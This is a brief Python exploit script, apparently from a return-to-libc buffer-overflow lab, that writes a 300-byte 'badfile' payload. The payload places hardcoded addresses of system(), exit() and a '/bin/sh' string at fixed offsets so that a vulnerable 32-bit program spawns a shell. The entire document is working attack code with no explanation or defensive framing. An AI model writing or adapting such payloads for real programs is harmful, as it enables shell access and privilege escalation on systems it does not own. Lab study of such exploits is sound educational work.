#!/usr/bin/python3
import sys


content = bytearray(0xaa for i in range(300))

a3 = 0xffffd495 # address of 'bin/sh'
content[120:124] = (a3).to_bytes(4, byteorder='little')

a2 = 0xf7e04f80 # address of exit() function
content[116:120] = (a2).to_bytes(4, byteorder='little')

a1 = 0xf7e12420 # address of system() function
content[112:116] = (a1).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as wb:
    wb.write(content)